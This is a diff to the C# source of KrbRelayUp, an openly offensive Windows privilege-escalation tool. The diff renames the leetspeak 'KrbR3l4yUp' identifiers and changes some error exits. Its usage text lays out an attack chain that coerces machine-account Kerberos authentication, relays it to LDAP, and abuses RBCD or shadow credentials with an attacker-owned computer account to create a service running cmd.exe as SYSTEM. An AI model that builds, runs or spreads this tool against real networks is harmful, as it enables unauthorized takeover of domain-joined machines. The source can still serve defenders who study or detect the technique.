@@ -5,7 +5,7 @@ using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 
-namespace KrbR3l4yUp
+namespace KrbRelayUp
 {
     public static class Options
     {
@@ -39,7 +39,7 @@ namespace KrbR3l4yUp
 
         // RBCD Method
         public static bool rbcdCreateNewComputerAccount = false;
-        public static string rbcdComputerName = "KrbR3l4yUp";
+        public static string rbcdComputerName = "KRBRELAYUP";
         public static string rbcdComputerPassword = null;
         public static string rbcdComputerPasswordHash = null;
         public static string rbcdComputerSid = null;
@@ -81,14 +81,14 @@ namespace KrbR3l4yUp
             Console.WriteLine("FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.");
             Console.WriteLine("");
             Console.WriteLine("RELAY: First phase of the attack. Will Coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.");
-            Console.WriteLine("Usage: KrbR3l4yUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
+            Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
             Console.WriteLine("    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)");
             Console.WriteLine("    -p   (--Port)                     Port for Com Server (default=12345)");
             Console.WriteLine("    -cls (--Clsid)                    CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)");
             Console.WriteLine("");
             Console.WriteLine("    # RBCD Method:");
             Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
-            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KrbR3l4yUp$)");
+            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
             Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
             Console.WriteLine("");
             Console.WriteLine("    # SHADOWCRED Method:");
@@ -101,14 +101,14 @@ namespace KrbR3l4yUp
 
             Console.WriteLine("\n");
             Console.WriteLine("SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.");
-            Console.WriteLine("Usage: KrbR3l4yUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
+            Console.WriteLine("Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
             Console.WriteLine("    -m   (--Method)                   Abuse method used in RELAY phase <rbcd/shadowcred> (default=rbcd)");
             Console.WriteLine("    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)");
             Console.WriteLine("    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
             Console.WriteLine("    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
             Console.WriteLine("");
             Console.WriteLine("    # RBCD Method:");
-            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KrbR3l4yUp$)");
+            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
             Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)");
             Console.WriteLine("    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)");
             Console.WriteLine("");
@@ -118,7 +118,7 @@ namespace KrbR3l4yUp
 
             Console.WriteLine("\n");
             Console.WriteLine("KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.");
-            Console.WriteLine("Usage: KrbR3l4yUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>\n");
+            Console.WriteLine("Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>\n");
             Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
             Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
 
@@ -174,7 +174,7 @@ namespace KrbR3l4yUp
                 {
                     GetHelp();
                     Console.WriteLine($"\n[-] Unrecognized RELAY attack type \"{args[iMethod + 1]}\"");
-                    return;
+                    Environment.Exit(0);
                 }
             }
             Options.comServerPort = (iComServerPort != -1) ? args[iComServerPort + 1] : Options.comServerPort;
@@ -230,7 +230,7 @@ namespace KrbR3l4yUp
 
         public static void Main(string[] args)
         {
-            Console.WriteLine("KrbR3l4yUp - Relaying you to SYSTEM\n");
+            Console.WriteLine("KrbRelayUp - Relaying you to SYSTEM\n");
 
             ParseArgs(args);
 
@@ -417,7 +417,7 @@ namespace KrbR3l4yUp
             {
                 Console.WriteLine($"[-] Could not find computer account SID:");
                 Console.WriteLine($"[-] {e.Message}");
-                return null;
+                Environment.Exit(0);
             }
             return null;
         }
